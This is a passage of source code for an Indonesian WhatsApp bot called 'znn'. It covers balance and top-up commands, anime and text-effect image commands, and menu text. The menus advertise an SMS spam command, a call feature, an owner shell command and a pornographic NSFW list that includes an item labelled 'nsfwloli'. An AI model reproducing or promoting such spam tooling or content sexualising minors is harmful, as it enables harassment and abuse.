} else reply(`Gunakan dengan cara ${command} *Reply Pesan Nominal*\n\nContoh : Reply Pesan Target ${command} 100`)
}
break
case 'ceksaldo':
if (!froms) return reply(`Mau cek saldo siapa? coba reply atau tag 🤔`)
if (froms == global.owner || froms == botNumber) return reply(`Ups, Saldo ${froms == global.owner ? 'creator saya' : 'bot'} Privasi!`)
if (db.users[froms] == undefined) return reply('User tidak terdaftar didalam database!')
if (froms == sender) return reply('Ketik aja saldo lah')
reply795(`*INFO SALDO DARI*\n\nTarget Cek : ${znn.getName(froms)}\nSaldo : Rp. ${toRupiah(cekSaldo(froms, db_saldo))}\nNomor : ${froms.split('@')[0]}`)
break
case 'saldo':{
const Kalender0001 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
reply795(`*INFO SALDO ANDA*

  Name : ${pushname}
  Nomor : ${m.sender.split("@")[0]}
  Saldo : Rp${toRupiah(cekSaldo(m.sender, db_saldo))}
  Tanggal : ${calender}
 
Note : anda hanya bisa melakukan pembelian di bot znn saja, ketik *menu shop* untuk berbelanja`)
}
break
//=================================================//
case 'acc': case 'addsaldo':{
if (!isCreator) return reply(`*[ System Notice ]* User tidak bisa aksess command ini`)
const Kalender000 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} ${nomore},20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} ${nomore},2000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await delay(1000)
reply(`*USER SALDO*
  ID : ${sender.split("@")[0]}
  Nomor : ${q.split(",")[0]}
  Tanggal : ${Kalender000}
  Saldo : Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))} `)
        }
case 'kirim': {
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
let messageText = `Operasi *Topup* sebanyak Rp. ${q.split(",")[1]} suksess, ketik *.saldo* untuk melihat info anda`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

znn.sendMessage(targetNumber, {
text: `${messageText}`,
mentions: [sender]
}, {
quoted: m
}).then(() => {
reply('Berhasil ✓');
}).catch(() => {
m.reply('Gagal mengirim pesan!');
});
}
break;
//=================================================//
case 'minsaldo':
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah`)
const Kalender010 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`*USER SALDO*
  ID : ${q.split(",")[0]}
  Nomor : ${q.split(",")[0]}
  Tanggal : ${Kalender010}
  Saldo : Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
//=================================================//
case 'cekmin':
if (!text) return reply('reply bukti pembayaran anda\n\ncontoh : .cekmin udah topup 40ribu')
if ((!isImage) || !isQuotedImage) {
try {
let media = await quoted.download()
reply('pesan dikirim ke owner, tunggu owner *acc* saldo anda')
await delay(100)
znn.sendMessage(global.owner, { image: media, caption: `${text}`}, { quoted: m})
} catch (err) {
reply(`Gambar tidak di temukan!\nCoba untuk ulangi kirim/reply gambar dengan caption ${prefix+command}`)
}
} else reply(`Kirim/reply gambar dengan caption ${prefix+command}`)
break
case 'topup':
if (!m.isGroup) return reply795('Silahkan lakukan topup di group dibawah agar anda tidak kebingungan saat melakukan proses topup\nhttps://chat.whatsapp.com/FM2SIobi3F2FGrVnEV7WZZ')
if (!args[0]) return reply(`*[ Topup ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Topup ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply795('Kebanyakan!')
let countol = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (countol < 100) return reply795('*[ Topup ]* minimal Rp.1000 untuk bisa topup!')
znn.sendMessage(global.owner, {text: `*REQUEST TOPUP*\n  Nama : ${pushname}\n  Nomor : wa.me/${nomore}\n  Topup : Rp. ${text}`},{quoted: m})
await delay(100)
reply795(`*REQUEST TOPUP*\n\n  Nama : ${pushname}\n  Nomor : ${tag}\n  Topup : ${countol}\n  Tanggal : ${calender}\n\n*E-WALET PRABAYAR*\n\n  Dana : *083891170044*\n  Nama : C**U\n\n  ShoppePay : *083891170044*\n  Nama : C**U\n\nLakukan pembayaran ke nomor tersebut dan jika sudah melakukan topup ketik *cekmin* dengan reply foto bukti transaksi anda!\n\nwaktu expired topup 15 menit`)
/*setTimeout(() => {
m.reply('15 menit berlalu, silahkan ketik *topup* untuk melakukan topup kembali (/¯◡ ‿ ◡)/¯')
znn.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
}, 900000)*/
break



case 'button':
let teskd = 'Halo, aku\n'
const sections = [{
title: "LIST MENU",
rows: [
{
title: "🙇 MENU BOT",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "🚀 ROOM CONFES / MENFES",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "⚠️ CEK LIMIT SAYA",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "👤 OWNER",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "📢 INFO BOT CONFES",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "🏷️ BUY PREMIUM LIMIT",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "💸 DONASI",
rowId: '',
description: ''
}
]
}, 
{
title: " ",
rows: [
{
title: "📢 INFO GROUP WHATSAPP",
rowId: '',
description: ''
}
]
},
{
title: " ",
rows: [
{
title: "❕ SOURCE CODE",
rowId: '',
description: ''
}
]
},         
]
const listMessage = {
text: teskd,
footer: "mes",
title: "memes",
buttonText: "LIST MENU",
sections
}
znn.sendMessage(from, listMessage, {quoted: m})
break
































// FITUR ANIME
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elena': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isGroup) return onlyGroup()
reply("Gambar Akan Dikirim Lewat Private Chat")
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tataznn.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
znn.sendMessage(m.sender, { image: { url: yeha }, caption : 'Done Bwang, jangan lupa share znn bot' }, { quoted: m })
}
break

















































// FITUR EPHOTO
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!isGroup) return onlyGroup()
if (!q) return reply(`Example : ${prefix+command} znn`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
znn.sendMessage(m.chat, { image: { url: haldwhd }, caption: `powerewd by znn` }, { quoted: m })
}
break







































// FITUR TEXTPRO











































// MENU BOT
case 'menu': case 'znn': case 'help':
let menuutama = `*[ BOT INFO ]*
• Bot Name : znn
• Library : @whiskeysocket
• Version : 1,5 *[ latest ]*
• Memory : ${FileSize(process.memoryUsage().rss)} / ${process.env.SERVER_MEMORY ?? 0} MB
• Speed : ${latensi.toFixed(4)} miliseconds
• Saldo : Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}
*LIST MENU :*
• ${prefix}menu fun
• ${prefix}menu rpg
• ${prefix}menu tools
• ${prefix}menu nsfw
• ${prefix}menu shop
• ${prefix}menu game
• ${prefix}menu anime
• ${prefix}menu group
• ${prefix}menu owner
• ${prefix}menu primbon
• ${prefix}menu convert
• ${prefix}menu ephoto
• ${prefix}menu search
• ${prefix}menu chatbot
• ${prefix}menu jadibot
• ${prefix}menu photoxy
• ${prefix}menu asupan
• ${prefix}menu random
• ${prefix}menu textpro
• ${prefix}menu audio
• ${prefix}menu download`

let menurandom = `*RANDOM-IMAGE*
• ${prefix}hijab
• ${prefix}indo
• ${prefix}japanese
• ${prefix}korean
• ${prefix}malay
• ${prefix}randomgirl
• ${prefix}randomboy
• ${prefix}thai
• ${prefix}vietnamese
• ${prefix}aesthetic
• ${prefix}chinese
• ${prefix}pubg
• ${prefix}antiwork
• ${prefix}blackpink2
• ${prefix}cosplay
• ${prefix}cat
• ${prefix}doggo
• ${prefix}justina
• ${prefix}kayes
• ${prefix}bike
• ${prefix}boneka
• ${prefix}kpop
• ${prefix}notnot
• ${prefix}car
• ${prefix}rose
• ${prefix}ryujin
• ${prefix}ulzangboy
• ${prefix}ulzanggirl
• ${prefix}mobilelegend`

let menunsfw = `*NSFW-MENU*
• ${prefix}hentai  
• ${prefix}gifhentai  
• ${prefix}gifblowjob  
• ${prefix}hentaivid  
• ${prefix}hneko  
• ${prefix}nwaifu  
• ${prefix}animespank  
• ${prefix}trap  
• ${prefix}gasm  
• ${prefix}ahegao  
• ${prefix}ass  
• ${prefix}bdsm  
• ${prefix}blowjob  
• ${prefix}cuckold  
• ${prefix}cum  
• ${prefix}milf  
• ${prefix}eba  
• ${prefix}ero  
• ${prefix}femdom  
• ${prefix}foot  
• ${prefix}gangbang  
• ${prefix}glasses  
• ${prefix}jahy  
• ${prefix}masturbation  
• ${prefix}manga  
• ${prefix}neko-hentai  
• ${prefix}neko-hentai2  
• ${prefix}nsfwloli  
• ${prefix}orgy  
• ${prefix}panties   
• ${prefix}pussy  
• ${prefix}tentacles  
• ${prefix}thights  
• ${prefix}yuri  
• ${prefix}zettai 
• ${prefix}bokep1-27
• ${prefix}art
• ${prefix}paptt
• ${prefix}awoo
• ${prefix}hentaivid
• ${prefix}hentaivid2
• ${prefix}xnxxs *judul*
• ${prefix}xnxxdl *link*`

let menutools = `*OWNER-TOOLS*
• ${prefix}ping
• ${prefix}runtime
• ${prefix}opsichatpc *nomor*
• ${prefix}opsichatgc *id*
• ${prefix}listpc
• ${prefix}listgc
• ${prefix}listonline
• ${prefix}addcase *code*
• ${prefix}addsewa *link + time*
• ${prefix}listsewa
• ${prefix}checksewa
• ${prefix}delsewa
• ${prefix}restart *restart bot*
• ${prefix}shutdown *mati*
• ${prefix}buatgc *namanya*
• ${prefix}ipbot
• ${prefix}shortlink *url*
• ${prefix}ebinary *text*
• ${prefix}dbinary *text*
• ${prefix}clearjdb
• ${prefix}getdb
• ${prefix}delsampah
• ${prefix}encrypt *text/code*
• ${prefix}ban
• ${prefix}nowa *nomor*
• ${prefix}banned *mention or reply*
• ${prefix}call *telepon*
• ${prefix}spamsms *pesan spam*
• ${prefix}gantifile *nama file*
• ${prefix}delfolder *nama folder*
• ${prefix}nomor-wa *nomornya*
• $ *exec*
• >`

let menuasupan = `*ASUPAN-MENU*
• ${prefix}asupan1-20
• ${prefix}tiktokgirl
• ${prefix}tiktoknukthy
• ${prefix}tiktokkayes
• ${prefix}tiktokpanrika
• ${prefix}tiktoknotnot
• ${prefix}tiktokghea 
• ${prefix}tiktoksantuy 
• ${prefix}tiktokbocil `

let menuphotoxy = `*PHOTOXY-MENU*
• ${prefix}shadow *text*
• ${prefix}write *text*
• ${prefix}romantic *text*
• ${prefix}burnpaper *text*
• ${prefix}smoke *text*
• ${prefix}narutobanner *text*
• ${prefix}love *text*
• ${prefix}undergrass *text*
• ${prefix}doublelove *text*
• ${prefix}coffecup *text*
• ${prefix}underwaterocean *text*
• ${prefix}smokyneon *text*
• ${prefix}starstext *text*
• ${prefix}rainboweffect *text*
• ${prefix}balloontext *text*
• ${prefix}metalliceffect *text*
• ${prefix}embroiderytext *text*
• ${prefix}flamingtext *text*
• ${prefix}stonetext *text*
• ${prefix}writeart *text*
• ${prefix}summertext *text*
• ${prefix}wolfmetaltext *text*
• ${prefix}nature3dtext *text*
• ${prefix}rosestext *text*
• ${prefix}naturetypography *text*
• ${prefix}quotesunder *text*
• ${prefix}shinetext *text*`

let menujadibot = `*JADI-BOT*
• ${prefix}jadibot *waktu*
• ${prefix}stop *mematikan*
• ${prefix}start *memulai*
• ${prefix}listjadibot
• ${prefix}delsession
• ${prefix}getsession
• ${prefix}carajadibot`

let menutextpro = `*TEXT-MAKER*
• ${prefix}blackpink *text*
• ${prefix}neon *text*
• ${prefix}greenneon *text*
• ${prefix}advanceglow *text*
• ${prefix}futureneon *text*
• ${prefix}sandwriting *text*
• ${prefix}sandsummer *text*
• ${prefix}sandengraved *text*
